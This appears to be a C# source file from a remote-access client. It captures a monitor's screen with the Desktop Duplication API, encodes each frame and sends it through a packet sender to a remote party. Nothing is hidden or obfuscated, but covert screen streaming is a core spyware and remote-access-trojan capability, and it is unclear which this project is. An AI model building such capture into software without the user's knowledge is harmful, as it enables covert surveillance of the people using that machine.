using DesktopDuplication;
using SharpDX.DXGI;
using SharpDX;
using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using celestialC.Helper.Services.compression;

namespace celestialC.Helper
{
    public static class DuplicateController
    {
        private static DesktopDuplicator desktopDuplicator = new DesktopDuplicator();
        public static System.Drawing.Rectangle _boundsRectangle;
        private static int _currentmonik;
        private static bool IsWindows8OrNewer()
        {
            var os = Environment.OSVersion;
            return os.Platform == PlatformID.Win32NT &&
                   (os.Version.Major > 6 || (os.Version.Major == 6 && os.Version.Minor >= 2));
        }

        private static bool IsSupported
        {
            get
            {
                if (!IsWindows8OrNewer())
                    return false;
                try
                {
                    var adapter = new Factory1().GetAdapter1(0);
                    new Device((IntPtr)adapter).Dispose();
                    return true;
                }
                catch (SharpDXException)
                {
                    return false;
                }
            }
        }
        public static bool Initialize(int monitor)
        {
            if (!IsSupported)
                return false;
            try
            {
                Thread.Sleep(250);
                DesktopDuplicator.Initialize(monitor);
                _boundsRectangle = Screen.AllScreens[monitor].Bounds;
                _currentmonik = monitor;
                return true;
            }
            catch
            {
                return false;
            }
        }

    
        public static void sendScreenShot(IStreamCodec streamCodec)
        {
            byte[] imgbyte = null;
            try
            {
                imgbyte = desktopDuplicator.CaptureScreen(streamCodec).ToArray();
            }
            catch
            {
                DesktopDuplicator.Initialize(_currentmonik);
            }
            if (imgbyte != null)
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.ImageType);
                ToSend.AddRange(imgbyte);
                PacketSender.Send(ToSend.ToArray());
            }
        }

        public static void Dispose()
        {
            try
            {
                desktopDuplicator.Dispose();
            }
            catch { }
        }
    }
}
